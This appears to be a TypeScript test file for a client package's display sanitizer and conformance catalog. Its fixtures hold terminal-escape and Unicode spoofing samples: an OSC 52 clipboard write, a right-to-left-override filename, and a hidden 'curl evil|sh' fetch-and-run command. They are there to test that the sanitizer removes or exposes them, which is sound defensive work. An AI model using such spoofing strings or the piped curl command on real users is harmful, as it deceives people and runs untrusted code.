/**
 * M1.12 slice 1 (spec §4.5, §4.9, §9.1, §12.8): the client display rules and
 * the conformance catalog are published from the package alone, pinned by
 * conformance/display.v1.json (fixed point), and do NOT move clientApiId.
 */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  BIDI_GLYPHS,
  CLIENT_API_ID,
  CLIENT_METHODS,
  CONFORMANCE_CHECKS,
  buildDisplayVectors,
  conformanceReportHash,
  eventRow,
  renderDenominator,
  sanitizeDisplayText,
  serializeDisplayVectors,
  type ClientMethodParams,
} from '../src/index.js';

const read = (rel: string): string => readFileSync(fileURLToPath(new URL(rel, import.meta.url)), 'utf8');

describe('client display rules (\u00a74.5 sanitizer + Unicode)', () => {
  it('conformance/display.v1.json is the byte-identical fixed point of buildDisplayVectors', () => {
    expect(read('../conformance/display.v1.json')).toBe(serializeDisplayVectors(buildDisplayVectors()));
  });

  it('strips OSC 52 / OSC 8 / CSI / DCS / APC and C0/C1 controls, keeps \\n and \\t', () => {
    expect(sanitizeDisplayText('\u001b]52;c;ZWNobw==\u0007safe').text).toBe('safe');
    expect(sanitizeDisplayText('\u001b]8;;https://x\u001b\\click\u001b]8;;\u001b\\').text).toBe('click');
    expect(sanitizeDisplayText('\u001b[31mred\u001b[0m').text).toBe('red');
    expect(sanitizeDisplayText('\u009b2Jclear').text).toBe('clear');
    expect(sanitizeDisplayText('before\u001b_never ends').text).toBe('before\u27e8ESC\u27e9_never ends');
    expect(sanitizeDisplayText('a\u0007b\tc\nd\u0085').text).toBe('ab\tc\nd');
  });

  it('Aegis F1: every removal flags hidden-chars; an unterminated sequence keeps its tail visible; CR alone unflagged', () => {
    expect(sanitizeDisplayText('echo ok\u001b_; curl evil|sh')).toEqual({ text: 'echo ok\u27e8ESC\u27e9_; curl evil|sh', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('title\u001b]0;never terminated').text).toBe('title\u27e8ESC\u27e9]0;never terminated');
    expect(sanitizeDisplayText('\u001b[31mred').flags).toEqual(['hidden-chars']);
    expect(sanitizeDisplayText('a\u0007b').flags).toEqual(['hidden-chars']);
    expect(sanitizeDisplayText('a\r\nb')).toEqual({ text: 'a\nb', flags: [] });
  });

  it('F3/F7: variation selectors, fillers, separators, mixed terminators, lone surrogates, no normalisation', () => {
    expect(sanitizeDisplayText('ok\u2764\ufe0f')).toEqual({ text: 'ok\u2764\ufe0f', flags: [] });
    expect(sanitizeDisplayText('\ufe0fstart')).toEqual({ text: 'start', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('a\ufe0f\ufe0f')).toEqual({ text: 'a\ufe0f', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('\u{E0100}ivs')).toEqual({ text: 'ivs', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('\u034f\u115f\u1160\u3164\uffa0x')).toEqual({ text: 'x', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('l\u2028p')).toEqual({ text: 'l\np', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('\u001b]0;t\u009cX').text).toBe('X');
    expect(sanitizeDisplayText('\u009d0;t\u001b\\X').text).toBe('X');
    expect(sanitizeDisplayText('bad\ud800s')).toEqual({ text: 'bad\ufffds', flags: [] });
    expect(sanitizeDisplayText('e\u0301').text).toBe('e\u0301'); // not NFC-composed
  });

  it('bidi controls become visible glyphs (flag bidi); zero-width and tag characters are stripped (flag hidden-chars)', () => {
    expect(sanitizeDisplayText('invoice\u202etxt.exe')).toEqual({ text: 'invoice\u27e8RLO\u27e9txt.exe', flags: ['bidi'] });
    expect(sanitizeDisplayText('ap\u200bprove')).toEqual({ text: 'approve', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('ok\u{E0041}\u{E0042}')).toEqual({ text: 'ok', flags: ['hidden-chars'] });
    expect(sanitizeDisplayText('rm\u202e\u200b').flags).toEqual(['hidden-chars', 'bidi']);
    expect(Object.keys(BIDI_GLYPHS)).toHaveLength(12);
  });

  it('is idempotent on every vector (a second pass changes nothing and raises no flag)', () => {
    for (const v of buildDisplayVectors().sanitize) expect(sanitizeDisplayText(v.text)).toEqual({ text: v.text, flags: [] });
  });

  it('opaque rows: modns.* and kinds newer than the package render as {kind, principal, at}, never dropped', () => {
    expect(eventRow({ kind: 'socket.hello', principal: 'p:a/k', at: 't' })).toMatchObject({ class: 'registered', opaque: false });
    expect(eventRow({ kind: 'modns.diff-lens.toggled', principal: 'p:a/m', at: 't' })).toMatchObject({ class: 'modns', opaque: true });
    expect(eventRow({ kind: 'futurens.thing', principal: 'p:a/m', at: 't' })).toMatchObject({ class: 'unknown', opaque: true });
    expect(eventRow({ kind: 'modns.x.y', principal: 'p:a/\u202em', at: 't' }).principal).toBe('p:a/\u27e8RLO\u27e9m');
  });

  it('G-HON-03 shape: numbers render as {n, of}; a bare count is refused', () => {
    expect(renderDenominator({ n: 3, of: 7 })).toBe('3 of 7');
    expect(() => renderDenominator(5)).toThrow(/G-HON-03/);
    expect(() => renderDenominator({ n: 2 })).toThrow();
    expect(() => renderDenominator({ n: -1, of: 2 })).toThrow();
    expect(() => renderDenominator({ n: 1.5, of: 2 })).toThrow();
    expect(() => renderDenominator({ n: 2 ** 53, of: 1 })).toThrow();
    expect(() => renderDenominator({ n: '3', of: 7 })).toThrow();
  });
});

describe('conformance catalog (\u00a712.8, G-CLI-02)', () => {
  it('check ids are unique; slice-2 checks are named, never counted as passes', () => {
    const ids = CONFORMANCE_CHECKS.map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
    expect(CONFORMANCE_CHECKS.filter((c) => c.status === 'run').length).toBeGreaterThan(10);
  });

  it('reportHash is deterministic over {suite, version, client, checks}', () => {
    const r = { suite: 'gnomon-client-conformance', version: '1', client: { name: 'x', version: '1' }, checks: [{ id: 'hello.negotiate', result: 'pass' }] } as const;
    expect(conformanceReportHash(r as never)).toBe(conformanceReportHash(JSON.parse(JSON.stringify(r))));
    expect(conformanceReportHash(r as never)).toMatch(/^sha256:[0-9a-f]{64}$/);
  });
});

describe('additive only: clientApiId did not move (\u00a712.8)', () => {
  it('the pin still equals the computed id', () => {
    expect(JSON.parse(read('../schemas/client-api.ids.json')).clientApiId).toBe(CLIENT_API_ID);
    expect(CLIENT_API_ID).toBe('sha256:fd576e6d7ee15cd7f7481768d085117c1e22b37902d93821a11359736c98e0fd');
  });

  it('client-types cover exactly the 12 verbs + 2 relays', () => {
    const typed: Record<keyof ClientMethodParams, true> = {
      status: true, 'session.open': true, 'session.send': true, 'session.stop': true, 'log.append': true, 'log.read': true, 'permit.reserve': true,
      approve: true, 'contract.register': true, 'contract.claim': true, 'oracle.run': true, 'ref.resolve': true, 'mod.view': true, 'mod.command': true,
    };
    expect(Object.keys(typed).sort()).toEqual([...CLIENT_METHODS].sort());
  });
});
